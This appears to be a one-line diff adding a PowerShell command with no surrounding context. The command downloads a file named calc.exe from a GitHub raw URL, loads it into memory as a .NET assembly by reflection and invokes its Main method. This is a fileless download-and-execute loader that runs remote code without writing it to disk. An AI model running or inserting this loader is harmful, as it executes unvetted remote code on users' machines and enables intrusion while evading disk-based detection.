@@ -1,0 +1,1 @@
+$bytes = (Invoke-WebRequest "https://raw.githubusercontent.com/adicpnn/ad-tools/main/calc.exe").Content;$assembly = [System.Reflection.Assembly]::Load($bytes);$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))
